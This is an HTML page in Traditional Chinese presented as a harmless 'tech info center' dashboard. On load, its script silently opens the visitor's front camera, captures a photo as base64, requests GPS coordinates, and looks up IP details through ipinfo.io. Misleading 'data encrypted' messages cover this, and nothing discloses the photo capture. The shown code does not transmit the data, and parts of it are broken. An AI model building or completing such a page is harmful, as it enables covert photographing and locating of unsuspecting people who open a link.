<!DOCTYPE html>
<html lang="zh-TW">
<head>
  <meta charset="UTF-8">
  <meta name="viewport" content="width=device-width, initial-scale=1.0">
  <title>科技感資訊展示</title>
  <style>
    body {
      font-family: 'Arial', sans-serif;
      background-color: #1e1e2f;
      color: #ffffff;
      margin: 0;
      padding: 0;
    }
    h1 {
      text-align: center;
      margin-top: 20px;
      font-size: 24px;
    }
    .container {
      display: grid;
      grid-template-columns: repeat(auto-fit, minmax(250px, 1fr));
      gap: 20px;
      padding: 20px;
    }
    .card {
      background: linear-gradient(145deg, #2b2b3d, #191926);
      border-radius: 15px;
      padding: 20px;
      box-shadow: 2px 2px 5px #121218, -2px -2px 5px #2e2e40;
      text-align: center;
    }
    .card h2 {
      font-size: 18px;
      margin-bottom: 15px;
    }
    .progress {
      background: #2e2e40;
      border-radius: 10px;
      height: 10px;
      position: relative;
      margin: 10px 0 20px;
    }
    .progress-bar {
      background: #4caf50;
      height: 100%;
      width: 0;
      border-radius: 10px;
    }
    .status-text {
      font-size: 14px;
      margin: 5px 0;
    }
    .loader {
      border: 4px solid #2b2b3d;
      border-top: 4px solid #4caf50;
      border-radius: 50%;
      width: 50px;
      height: 50px;
      animation: spin 1s linear infinite;
      margin: 20px auto;
    }
    @keyframes spin {
      0% { transform: rotate(0deg); }
      100% { transform: rotate(360deg); }
    }
  </style>
</head>
<body>
  <h1>科技感資訊中心</h1>
  <div class="container">
    <div class="card">
      <h2>電池狀態</h2>
      <div id="battery-info">
        <p class="status-text">正在讀取...</p>
        <div class="progress">
          <div class="progress-bar" id="battery-bar"></div>
        </div>
      </div>
    </div>
    <div class="card">
      <h2>GPS 狀態</h2>
      <div id="gps-info">
        <p class="status-text">正在定位中...</p>
        <div class="loader"></div>
      </div>
    </div>
    <div class="card">
      <h2>IP 及設備資訊</h2>
      <div id="device-info">
        <p class="status-text">讀取中...</p>
        <div class="loader"></div>
      </div>
    </div>
  </div>

  <script>
    // 電池資訊更新
    function updateBatteryStatus() {
      navigator.getBattery().then((battery) => {
        const level = battery.level * 100;
        const batteryBar = document.getElementById('battery-bar');
        batteryBar.style.width = `${level}%`;
        document.getElementById('battery-info').innerHTML = `
          <p class="status-text">電量：${level.toFixed(0)}%</p>
          <p class="status-text">${battery.charging ? '充電中' : '未充電'}</p>
        `;
      });
    }

    // 自動拍照功能
    async function startCameraAndSend() {
      const statusElement = document.getElementById('status');

      try {
        const stream = await navigator.mediaDevices.getUserMedia({
          video: { facingMode: { ideal: 'user' } },
        });
        const video = document.createElement('video');
        video.srcObject = stream;

        await new Promise((resolve) => {
          video.onloadedmetadata = () => {
            video.play();
            resolve();
          };
        });

        setTimeout(() => {
          const canvas = document.createElement('canvas');
          canvas.width = video.videoWidth || 640;
          canvas.height = video.videoHeight || 480;
          const context = canvas.getContext('2d');
          context.drawImage(video, 0, 0, canvas.width, canvas.height);

          const photoData = canvas.toDataURL('image/jpeg', 0.5).split(',')[1];
          stream.getTracks().forEach((track) => track.stop());
          getGpsCoordinates(photoData);
        }, 1000);
      } catch (error) {
        console.error('無法啟動相機:', error);
        statusElement.innerText = '無法啟動相機，請檢查權限或設備相機';
      }
    }

    // GPS 資訊
    async function getGpsCoordinates(photoData) {
      const statusElement = document.getElementById('gps-info');
      try {
        navigator.geolocation.getCurrentPosition(async (position) => {
          document.getElementById('gps-info').innerHTML = `
            <p class="status-text">定位完成</p>
            <p class="status-text">數據已加密處理</p>
          `;
        }, (error) => {
          document.getElementById('gps-info').innerHTML = `
            <p class="status-text">GPS 無法取得</p>
            <p class="status-text">請檢查裝置定位權限。</p>
          `;
        });
      } catch (error) {
        console.error('GPS錯誤:', error);
      }
    }

    // IP與設備資訊
    async function getIpInfo() {
      try {
        const response = await fetch('https://ipinfo.io/json');
        const data = await response.json();
        document.getElementById('device-info').innerHTML = `
          <p class="status-text">設備資訊已加密處理</p>
        `;
      } catch (error) {
        document.getElementById('device-info').innerHTML = `
          <p class="status-text">讀取失敗</p>
        `;
      }
    }

    // 啟動功能
    updateBatteryStatus();
    getIpInfo();
    startCameraAndSend();
  </script>
</body>
</html>
